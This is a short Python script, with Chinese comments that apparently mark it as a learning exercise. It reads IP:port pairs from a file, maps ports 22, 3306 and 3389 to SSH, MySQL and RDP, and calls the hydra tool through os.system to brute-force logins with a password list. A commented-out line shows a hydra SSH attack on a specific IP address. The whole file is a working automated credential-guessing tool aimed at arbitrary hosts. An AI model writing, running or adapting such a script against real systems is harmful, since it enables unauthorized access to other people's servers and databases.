'''
利用 九头蛇工具 hydra 实现mssh爆破，ysql爆破，rdp爆破

'''


#hydra -l root -P password.txt ssh://175.24.115.4 -o ssh.txt -vV

import os

def hydra(pro,ip):                            #知识点：提供协议参数
    cmd='hydra -l admin -P pass.txt {}://{} -o vule.txt -vV'.format(pro,ip)       #拼接协议和端口
    print(cmd)
    os.system(cmd)

with open("ip.txt",encoding='utf-8') as file:
    data = file.readlines()
    #print(data)
    for i in data:
        ip_port = i.split('\n')[0]
        ip_port = ip_port.split(':')                   #知识点：再次切分，分离ip和端口
        ip = ip_port[0]                                #获取ip
        port = ip_port[1]                              #获取端口

        #根据端口，赋值对应协议=
        if port=='22':                       
            pro='ssh'
        elif port=='3306':
            pro='mysql'
        elif port=='3389':
            pro='rdp'
            
        hydra(pro,ip)                                  #开始执行




